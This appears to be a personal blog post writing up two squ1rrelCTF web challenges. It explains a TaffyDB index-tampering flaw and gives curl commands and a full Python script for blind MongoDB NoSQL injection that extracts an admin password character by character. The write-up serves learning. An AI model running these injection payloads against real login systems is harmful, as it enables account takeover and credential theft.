---
layout: post
title: "The Summer of Challs: Week 1"
date: 2024-05-09
categories: CTFs
---

This summer, I will be trying to do around 5-6 CTFs each week, and I’ll make a blog post about the 1 or 2 that I found most interesting. I usually work on web challenges, but I want to branch out more this summer - possibly more rev or maybe even pwn (a man can dream). I’ll also be putting up some other things on here, like random projects I’m working on.

This week, I only had time to check out a couple of challenges from the squ1rrelCTF. They were both web.

## JSON STORE

You’re presented with a queryable JSON database through a simple web app. You can post data with a username to the database, and you can get data through the same process.

![JSON Store - Empty](/assets/JSONStoreBlank.jpg)

When looking at some of the source code of the website, it seems that node.js checks if we add the username `admin` (it filters this out) and if we are inputting a string, so there is some level of sanitization.

Then, I found this in `index.js`:

```javascript
const express = require("express");
const path = require("path");
const TAFFY = require("taffydb").taffy;
```
What is taffyDB? A quick google search led me to this [Synk post](https://security.snyk.io/vuln/SNYK-JS-TAFFYDB-2992450).

The vulnerability is reported as “Internal Property Tampering”. Essentially, each time an entry is added into the database, an index is generated. The format of this index is the same each time: `T000002R` followed by a number that is usually zero'd out. If an index is found in a query, other query conditions are ignored and the data item is returned directly. It also appears that the first index for whatever “first object” is added in the DB is always `T000002R000002`.
Upon reading the Synk post a bit closer, and also checking this out, [TaffyDB Vuln](https://www.sitepoint.com/community/t/taffydb-security-vulnerability/406006/2), I found that you also have to set some parameter called `__s` to `true` in the query. In other words, if you put an `id` in the query, and set `__s` to `true`, the database will return all contents of the entry with that index.
So, we just have to find the index of whatever account has the flag as their password. I found this in `index.js`:

```javascript
const db = TAFFY([
    {"username": "admin", "comments": process.env.FLAG},
    {"username": "randomuser", "comments": "This is a test comment"},
]);
```

Just out of curiosity, I checked the index for random user. Sure enough, it was `T000002R000003`, meaning the indexes increment each time a new object is added. Either way, we now know the index of the admin username, and can get the flag. We can easily bypass the "admin" sanitization, because it doesn't matter what username we input:

![Getting the Flag](/assets/JSONStoreFlag.jpg)

While simple, I actually like these kinds of challenges. They showcase real vulnerabilities in software that (apparently) thousands of people are using, and they make you exercise the "vuln research" muscle a bit, even if it's just a simple google search.

## GOOSEMON

I wonder what this challenge could be about. We are told that the flag is a password. When opening the site, you are taken to a login page. Not much to see here.

![Login Portal](/assets/goosemonpic.jpg)

When looking at the source code, I found that (big surprise) they are using MongoDB. They also are filtering out any post requests including the word regex (this actually was slightly relieving, because I am not that good at regex yet). I also found that an account called admin was made, which has the flag as the password. Similarly to the last challenge, we will have to make a request to find the admin's password, but this time the word admin is not sanitized.

Additionally, any requests/queries you try to make through the login portal don’t give much feedback, so this is basically a blind injection. I doubt any kind of time delays will be involved, so the logical choice is to input some sort of conditional querying, and see if our requests are going through successfully or not.

I toyed with the idea of writing a script to execute this cURL command:

```bash
curl -X POST -H 'Content-Type: application/json' -d '{"username":"admin", "password": {"$gt":"squ1rell{a"}}'
```
Essentially, it uses the comparison operator. This slowly allows you to put together the password. The database goes to the admin entry, and then compares the password with `"squ1rell{a"`. If it is greater, it returns true. This is similar to the actual passwords matching in the database in terms of "true" being returned, so the server returns something like "login successful". If it isn’t greater, we know that we have to look at the previous character we tried. This method can slowly narrow down the password.

Once we get one character right, we append it,

```bash
curl -X POST -H 'Content-Type: application/json' -d '{"username":"admin", "password": {"$gt":"squ1rell{7a"}}'
```

and keep checking. However, this idea doesn’t work, because as you keep posting with a longer and longer password, the password itself actually contains the word "regex". In other words, this method requires us to post with as much of the password as we know, to see if the actual password is greater. This means the more characters we find out, the more characters we post, forcing us to post regex. 

So, we need a way of comparing single characters with a single character in the password, rather than comparing what we already have of the password to the actual thing. To do this, we need substring. I found the substring functionality for MongoDB here: [MongoDB Substring Functionality](https://www.mongodb.com/docs/manual/reference/operator/aggregation/substr/). It says that `$substr` is an aggregation operator. We need to make a query using this aggregation operator. 

In the Query and Projection Operators section of the MongoDB manual, I found this: [MongoDB Evaluation Operators](https://www.mongodb.com/docs/manual/reference/operator/query-evaluation/).

This `$expr` operator is exactly what we are looking for. We can also use the `$eq` operator, instead of `$gt`. Essentially, I want to take a substring of admin’s password, extracting a single character, and see if it is equal to each possible ASCII character. This way, we never have to make a post with the full "regex" word. 

Getting the syntax right was tricky, but if you stick with the manpages, you should be able to get it. Anyway, I came up with this script:

```python
import requests
import string

url = "http://34.132.166.199:5249/login"
flag = "squ1rrel{"
passwordIndex = len(flag)
charIndex = 0
while flag[-1] != "}":
    data = {
        "username": "admin",
        "$expr": {
            "$eq": [
                {"$substr": ["$password", passwordIndex, 1]}, string.printable[charIndex]
            ]
        }
    }
    response = requests.post(url, json=data)
    if response.status_code == 200:
        flag += string.printable[charIndex]
        print("Flag so far:", flag)
        passwordIndex += 1
        charIndex = 0
    else:
        charIndex += 1

print("Final flag: ", flag)
```
Running the script, we get this:

![Terminal with Flag](/assets/solvepic.jpg)

Cool challenge! I learned some interesting MongoDB stuff. Obviously, they should sanitize the inputs in the login portal to make this secure.

I am going on vacation for the next 10 days, but once I get back, the weekly grind will continue. 
